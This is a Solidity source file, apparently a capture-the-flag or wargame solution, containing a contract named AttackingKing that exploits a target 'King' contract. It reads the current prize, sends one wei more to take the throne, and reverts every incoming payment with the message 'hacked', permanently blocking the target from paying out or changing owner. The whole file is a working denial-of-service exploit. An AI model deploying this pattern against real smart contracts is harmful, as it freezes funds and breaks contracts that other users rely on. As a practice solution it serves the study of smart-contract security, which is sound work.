// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint256 currentPrizeAmount = currentPrize();
        (bool success, ) = contractAddress.call{value: currentPrizeAmount + 1}(
            ""
        );
        require(success, "send failed");
    }

    function currentPrize() internal view returns (uint256 prize) {
        (bool success, bytes memory _prize) = contractAddress.staticcall(
            abi.encodeWithSignature("_prize()")
        );
        require(success, "Failed to get current prize");
        prize = abi.decode(_prize, (uint256));
    }

    receive() external payable {
        revert("hacked");
    }
}
